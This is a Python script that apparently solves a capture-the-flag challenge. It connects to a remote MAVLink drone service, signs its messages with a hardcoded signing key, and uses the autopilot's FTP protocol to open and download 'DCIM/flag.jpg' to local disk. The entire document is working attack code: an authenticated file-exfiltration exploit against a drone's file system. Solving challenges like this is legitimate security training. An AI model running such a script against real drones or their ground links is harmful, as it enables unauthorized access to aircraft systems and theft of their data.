#!/usr/bin/env python3
import os, struct, time
from pymavlink import mavutil

os.environ["MAVLINK20"]="1"
HOST="0.cloud.chals.io";

PORT=15174
KEY=bytes.fromhex("d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126")

TARGET_SYS=1; TARGET_COMP=1
OP_TERMINATE=1; OP_RESET=2; OP_OPEN_RO=4; OP_READ=5; ACK=128; NAK=129
SEQ=0

def pkt(opcode,
        session=0,
        size=0,
        offset=0,
        data=b"",
        req_opcode=0):
    global SEQ

    header = struct.pack(
        "<HBBBBBBI",
        SEQ & 0xFFFF,      # Sequence number
        session,           # Session ID
        opcode,            # FTP opcode
        size,              # Request size
        req_opcode,        # Request opcode
        0,                 # Burst complete
        0,                 # Padding
        offset             # File offset
    )

    SEQ = (SEQ + 1) & 0xFFFF

    return (header + data).ljust(251, b"\x00")


def rpc(mav, payload):
    mav.mav.file_transfer_protocol_send(
        0,
        TARGET_SYS,
        TARGET_COMP,
        payload,
    )

    while True:
        msg = mav.recv_match(
            blocking=True,
            timeout=5,
        )

        if msg is None:
            raise TimeoutError("FTP response timeout")

        if msg.get_type() != "FILE_TRANSFER_PROTOCOL":
            continue

        raw = bytes(msg.payload)

        (
            seq,
            session,
            opcode,
            size,
            req_opcode,
            burst_complete,
            _,
            offset,
        ) = struct.unpack("<HBBBBBBI", raw[:12])

        return {
            "seq": seq,
            "session": session,
            "opcode": opcode,
            "size": size,
            "req_opcode": req_opcode,
            "burst_complete": burst_complete,
            "offset": offset,
            "data": raw[12:12 + size],
            "raw": raw,
        }
    
m = mavutil.mavlink_connection(
    f"tcp:{HOST}:{PORT}",
    dialect="ardupilotmega",
    source_system=255,
    source_component=190,
)

m.setup_signing(
    KEY,
    sign_outgoing=True,
    allow_unsigned_callback=lambda *_: True,
)

m.mav.heartbeat_send(
    mavutil.mavlink.MAV_TYPE_GCS,
    mavutil.mavlink.MAV_AUTOPILOT_INVALID,
    0,
    0,
    0,
)

time.sleep(0.5)

#
# Reset any existing FTP sessions
#
try:
    rpc(
        m,
        pkt(OP_RESET),
    )
except Exception:
    pass

filename = "DCIM/flag.jpg"

#
# Open file
#
response = rpc(
    m,
    pkt(
        OP_OPEN_RO,
        size=len(filename),
        data=filename.encode(),
    ),
)

if response["opcode"] != ACK:
    raise RuntimeError(response)

file_size = struct.unpack("<I", response["data"][:4])[0]

print(f"[+] File size : {file_size} bytes")

#
# Download file
#
buffer = bytearray()
offset = 0

while True:

    response = rpc(
        m,
        pkt(
            OP_READ,
            size=239,
            offset=offset,
        ),
    )

    if response["opcode"] == NAK:
        break

    if response["opcode"] != ACK:
        raise RuntimeError(response)

    buffer.extend(response["data"])
    offset += response["size"]

    print(f"\r{offset}/{file_size}", end="", flush=True)

print()

#
# Close session
#
rpc(
    m,
    pkt(OP_TERMINATE),
)

#
# Save file
#
with open("flag.jpg", "wb") as fp:
    fp.write(buffer)

print(f"[+] Saved {len(buffer)} bytes to flag.jpg")
